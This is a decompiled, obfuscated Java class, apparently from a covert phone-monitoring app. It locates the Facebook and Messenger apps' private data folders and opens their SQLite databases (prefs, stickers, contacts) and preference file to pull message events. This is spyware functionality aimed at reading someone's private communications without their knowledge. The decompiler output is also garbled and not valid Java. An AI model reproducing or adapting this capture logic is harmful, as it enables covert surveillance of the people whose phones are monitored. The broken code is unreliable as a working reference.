package com.vvt.capture.b.b;

import android.database.sqlite.SQLiteDatabase;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.p.c;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class d
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private String c;
  private com.vvt.base.b d;
  
  public d(String paramString, com.vvt.base.b paramb)
  {
    this.c = paramString;
    this.d = paramb;
  }
  
  public g a()
  {
    bool1 = a;
    if (bool1) {}
    localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    l1 = System.currentTimeMillis();
    long l2 = 10000L;
    l1 -= l2;
    try
    {
      boolean bool2 = e.a();
      if (bool2)
      {
        localObject1 = "com.facebook.katana";
        localObject1 = com.vvt.capture.b.a.a.a((String)localObject1);
        String str1 = this.c;
        str1 = e.c(str1);
        String str2 = this.c;
        str2 = e.e(str2);
        Object localObject2 = this.d;
        localObject2 = ((com.vvt.base.b)localObject2).f();
        localObject1 = e.a((String)localObject1, str1, str2, (String)localObject2);
        str1 = "com.facebook.orca";
        str1 = com.vvt.capture.b.a.a.a(str1);
        str2 = this.c;
        str2 = e.d(str2);
        localObject2 = this.c;
        localObject2 = e.e((String)localObject2);
        Object localObject3 = this.d;
        localObject3 = ((com.vvt.base.b)localObject3).f();
        str1 = e.a(str1, str2, (String)localObject2, (String)localObject3);
        boolean bool3 = a;
        if (bool3) {}
        localObject1 = com.vvt.capture.b.a.a.a((String)localObject1, str1);
        if (localObject1 != null) {
          l1 = ((com.vvt.capture.b.d)localObject1).h();
        }
      }
      Object localObject1 = Long.valueOf(l1);
      localFxSimpleEventReference.setReference((Long)localObject1);
      localObject4 = this.c;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject4 = Long.valueOf(l1);
        localFxSimpleEventReference.setReference((Long)localObject4);
        bool1 = b;
        if (bool1) {}
        localObject4 = this.c;
      }
    }
    finally
    {
      e.b(this.c);
    }
    e.b((String)localObject4);
    bool1 = a;
    if (bool1) {}
    return localFxSimpleEventReference;
  }
  
  public List a(int paramInt)
  {
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    long l1 = System.currentTimeMillis();
    long l2 = 10000L;
    l1 -= l2;
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    Object localObject3 = Long.valueOf(l1);
    localFxSimpleEventReference.setReference((Long)localObject3);
    localObject3 = new com/vvt/base/capture/FxSimpleEventReference;
    ((FxSimpleEventReference)localObject3).<init>();
    Object localObject4 = Long.valueOf(l1);
    ((FxSimpleEventReference)localObject3).setReference((Long)localObject4);
    try
    {
      bool1 = e.a();
      if (bool1)
      {
        localObject4 = "com.facebook.katana";
        localObject4 = com.vvt.capture.b.a.a.a((String)localObject4);
        String str2 = this.c;
        str2 = e.c(str2);
        Object localObject5 = this.c;
        localObject5 = e.e((String)localObject5);
        Object localObject6 = this.d;
        localObject6 = ((com.vvt.base.b)localObject6).f();
        localObject4 = e.a((String)localObject4, str2, (String)localObject5, (String)localObject6);
        str2 = "com.facebook.orca";
        str2 = com.vvt.capture.b.a.a.a(str2);
        localObject5 = this.c;
        localObject5 = e.d((String)localObject5);
        localObject6 = this.c;
        localObject6 = e.e((String)localObject6);
        Object localObject7 = this.d;
        localObject7 = ((com.vvt.base.b)localObject7).f();
        str2 = e.a(str2, (String)localObject5, (String)localObject6, (String)localObject7);
        boolean bool2 = a;
        if (bool2) {}
        localObject5 = com.vvt.capture.b.a.a.a(paramInt, (String)localObject4, str2);
        if (localObject5 != null)
        {
          long l3 = ((com.vvt.capture.b.d)localObject5).h();
          long l4 = 1L;
          l3 -= l4;
          localObject5 = Long.valueOf(l3);
          localFxSimpleEventReference.setReference((Long)localObject5);
        }
        localObject4 = com.vvt.capture.b.a.a.a((String)localObject4, str2);
        if (localObject4 != null)
        {
          l1 = ((com.vvt.capture.b.d)localObject4).h();
          localObject4 = Long.valueOf(l1);
          ((FxSimpleEventReference)localObject3).setReference((Long)localObject4);
        }
        localObject4 = this.c;
        e.b((String)localObject4);
        localObject1 = a(localFxSimpleEventReference, (g)localObject3);
      }
      localObject4 = this.c;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool1 = b;
        if (bool1) {}
        String str1 = this.c;
      }
    }
    finally
    {
      e.b(this.c);
    }
    e.b((String)localObject4);
    bool1 = a;
    if (bool1) {}
    return (List)localObject1;
  }
  
  public List a(g paramg1, g paramg2)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    SQLiteDatabase localSQLiteDatabase1 = null;
    SQLiteDatabase localSQLiteDatabase2 = null;
    SQLiteDatabase localSQLiteDatabase3 = null;
    SQLiteDatabase localSQLiteDatabase4 = null;
    Object localObject6;
    label1040:
    Object localObject3;
    for (Object localObject1 = "com.facebook.katana";; localObject3 = localObject6) {
      for (;;)
      {
        try
        {
          localObject1 = com.vvt.capture.b.a.a.a((String)localObject1);
          localObject4 = this;
          String str2 = this.c;
          str2 = e.c(str2);
          String str3 = this.c;
          str3 = e.e(str3);
          Object localObject5 = this.d;
          localObject5 = ((com.vvt.base.b)localObject5).f();
          localObject6 = e.a((String)localObject1, str2, str3, (String)localObject5);
          localObject1 = "com.facebook.orca";
          localObject1 = com.vvt.capture.b.a.a.a((String)localObject1);
          str2 = this.c;
          str2 = e.d(str2);
          str3 = this.c;
          str3 = e.e(str3);
          localObject5 = this.d;
          localObject5 = ((com.vvt.base.b)localObject5).f();
          str2 = e.a((String)localObject1, str2, str3, (String)localObject5);
          bool1 = a;
          if (bool1) {}
          Object localObject7 = com.vvt.capture.b.a.a.a((String)localObject6, str2);
          if (localObject7 != null)
          {
            localObject1 = paramg1.getReference();
            localObject1 = (Long)localObject1;
            long l1 = ((Long)localObject1).longValue();
            localObject1 = paramg2.getReference();
            localObject1 = (Long)localObject1;
            long l2 = ((Long)localObject1).longValue();
            localObject1 = ((com.vvt.capture.b.d)localObject7).b();
            Object localObject8 = "com.facebook.orca";
            bool1 = ((String)localObject1).equalsIgnoreCase((String)localObject8);
            if (!bool1) {
              break label1040;
            }
            localObject1 = str2;
            boolean bool2 = a;
            if (bool2) {}
            int i = 17;
            localSQLiteDatabase1 = c.a(i, (String)localObject1);
            localObject1 = ((com.vvt.capture.b.d)localObject7).b();
            localObject1 = e.a((String)localObject1);
            boolean bool3 = com.vvt.ag.b.a((String)localObject1);
            if (bool3) {
              continue;
            }
            str2 = "%s/%s";
            int k = 2;
            localObject6 = new Object[k];
            boolean bool4 = false;
            localObject8 = null;
            localObject6[0] = localObject1;
            bool4 = true;
            Object localObject9 = "prefs_db";
            localObject6[bool4] = localObject9;
            str2 = String.format(str2, (Object[])localObject6);
            localObject4 = this;
            localObject6 = this.c;
            localObject8 = ((com.vvt.capture.b.d)localObject7).b();
            localObject6 = e.a((String)localObject6, (String)localObject8);
            localObject8 = this.c;
            localObject8 = e.e((String)localObject8);
            localObject9 = this.d;
            localObject9 = ((com.vvt.base.b)localObject9).f();
            str2 = e.a(str2, (String)localObject6, (String)localObject8, (String)localObject9);
            bool4 = a;
            if (bool4) {}
            int m = 17;
            localSQLiteDatabase2 = c.a(m, str2);
            str2 = "%s/%s";
            m = 2;
            localObject8 = new Object[m];
            int i1 = 0;
            localObject9 = null;
            localObject8[0] = localObject1;
            i1 = 1;
            Object localObject10 = "stickers_db";
            localObject8[i1] = localObject10;
            str2 = String.format(str2, (Object[])localObject8);
            localObject4 = this;
            localObject8 = this.c;
            localObject8 = e.e((String)localObject8);
            localObject9 = this.d;
            localObject9 = ((com.vvt.base.b)localObject9).f();
            str2 = e.a(str2, (String)localObject6, (String)localObject8, (String)localObject9);
            boolean bool5 = a;
            if (bool5) {}
            int n = 17;
            localSQLiteDatabase3 = c.a(n, str2);
            str2 = "/data/data/%s/shared_prefs/com.facebook.orca_preferences.xml";
            n = 1;
            localObject8 = new Object[n];
            i1 = 0;
            localObject9 = null;
            localObject10 = ((com.vvt.capture.b.d)localObject7).b();
            localObject8[0] = localObject10;
            str2 = String.format(str2, (Object[])localObject8);
            localObject4 = this;
            localObject8 = this.c;
            localObject8 = e.d((String)localObject8);
            localObject9 = this.c;
            localObject9 = e.e((String)localObject9);
            localObject4 = this.d;
            localObject10 = localObject4;
            localObject10 = ((com.vvt.base.b)localObject4).f();
            localObject4 = localObject10;
            localObject8 = e.a(str2, (String)localObject8, (String)localObject9, (String)localObject10);
            bool3 = a;
            if (bool3) {}
            str2 = "%s/%s";
            i1 = 2;
            localObject9 = new Object[i1];
            localObject10 = null;
            localObject9[0] = localObject1;
            bool1 = true;
            localObject10 = "contacts_db2";
            localObject9[bool1] = localObject10;
            localObject1 = String.format(str2, (Object[])localObject9);
            localObject4 = this;
            str2 = this.c;
            str2 = e.e(str2);
            localObject9 = this.d;
            localObject9 = ((com.vvt.base.b)localObject9).f();
            localObject1 = e.a((String)localObject1, (String)localObject6, str2, (String)localObject9);
            bool3 = a;
            if (bool3) {}
            int j = 17;
            localSQLiteDatabase4 = c.a(j, (String)localObject1);
            localObject4 = this;
            localObject1 = this.c;
            str2 = ((com.vvt.capture.b.d)localObject7).b();
            k = -1 >>> 1;
            localObject7 = this.d;
            localObject1 = com.vvt.capture.b.a.a.a((String)localObject1, str2, localSQLiteDatabase3, localSQLiteDatabase2, localSQLiteDatabase1, l1, l2, k, (com.vvt.base.b)localObject7, (String)localObject8, localSQLiteDatabase4);
            localArrayList.addAll((Collection)localObject1);
          }
          if (localSQLiteDatabase1 != null) {
            localSQLiteDatabase1.close();
          }
          if (localSQLiteDatabase2 != null) {
            localSQLiteDatabase2.close();
          }
          if (localSQLiteDatabase3 != null) {
            localSQLiteDatabase3.close();
          }
          if (localSQLiteDatabase4 != null) {
            localSQLiteDatabase4.close();
          }
          localObject4 = this;
          localObject1 = this.c;
        }
        catch (Exception localException)
        {
          bool1 = b;
          if ((bool1) && (localSQLiteDatabase1 == null)) {
            continue;
          }
          localSQLiteDatabase1.close();
          if (localSQLiteDatabase2 == null) {
            continue;
          }
          localSQLiteDatabase2.close();
          if (localSQLiteDatabase3 == null) {
            continue;
          }
          localSQLiteDatabase3.close();
          if (localSQLiteDatabase4 == null) {
            continue;
          }
          localSQLiteDatabase4.close();
          localObject4 = this;
          String str1 = this.c;
          continue;
        }
        finally
        {
          if (localSQLiteDatabase1 == null) {
            continue;
          }
          localSQLiteDatabase1.close();
          if (localSQLiteDatabase2 == null) {
            continue;
          }
          localSQLiteDatabase2.close();
          if (localSQLiteDatabase3 == null) {
            continue;
          }
          localSQLiteDatabase3.close();
          if (localSQLiteDatabase4 == null) {
            continue;
          }
          localSQLiteDatabase4.close();
          Object localObject4 = this;
          e.b(this.c);
        }
        e.b((String)localObject1);
        bool1 = a;
        if (bool1) {}
        bool1 = a;
        if (bool1) {}
        return localArrayList;
        bool1 = a;
        if (!bool1) {}
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/removeFromPath/removeFromPath/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */